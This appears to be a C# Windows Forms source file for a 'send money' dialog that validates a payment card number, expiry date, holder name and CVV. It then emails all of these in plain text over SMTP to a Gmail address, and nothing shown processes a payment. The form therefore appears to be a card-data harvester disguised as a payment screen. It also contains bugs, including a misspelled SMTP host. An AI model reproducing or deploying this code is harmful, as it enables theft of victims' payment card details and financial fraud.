using System;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace BUILD.modules
{
    public partial class ForMoney : Form
    {
        public ForMoney()
        {
            InitializeComponent();
        }

        private void button_send_money_Click(object sender, EventArgs e)
        {
            try
            {
                label_message.Text = String.Empty;
                string num, date1, date2, holder, ccccv;
                if (!Regex.IsMatch((num = textBox_card_number.Text), "[0-9]{4} [0-9]{4} [0-9]{4} [0-9]{4}"))
                {
                    label_message.Text = "неверный номер карты";
                    return;
                }

                date1 = textBox_time_1.Text.Trim();
                date2 = textBox_time_2.Text.Trim();
                if (date1 == String.Empty || date2 == String.Empty)
                {
                    label_message.Text = "неверная дата";
                    return;
                }

                if ((Convert.ToInt32(date1) > 12 || Convert.ToInt32(date1) < 1))
                {
                    label_message.Text = "неверный месяц";
                    return;
                }

                if (Convert.ToInt32(date2) < (new DateTime()).Year % 100)
                {
                    label_message.Text = "неверный год";
                    return;
                }

                holder = textBox_name_surname.Text.Trim().ToUpper();
                if (holder == String.Empty)
                {
                    label_message.Text = "неверное имя владельца";
                    return;
                }

                ccccv = textBox_cccv.Text;
                if (!Regex.IsMatch(ccccv, "[0-9]{3}"))
                {
                    label_message.Text = "неверный cvc/cvv";
                    return;
                }
                try
                {

                    MailAddress from = new MailAddress("", "BUILD/IS");
                    MailAddress to = new MailAddress("");
                    MailMessage message = new MailMessage(from, to);
                    message.Subject = "деньга дали";
                    message.Body = $"номер:{num} дата: {date1}/{date2}, держатель: {holder}, cvc:{ccccv}";
                    SmtpClient client = new SmtpClient("stmp.gmail.com", 587);
                    client.Credentials = new NetworkCredential("", "");
                    client.EnableSsl = true;
                    client.Send(message);

                }
                catch (Exception exception)
                {
                    MessageBox.Show(exception.Message);
                }

                this.Close();
                
            }
            catch (Exception exception)
            {
                MessageBox.Show(exception.Message);
            }

        }
    }
}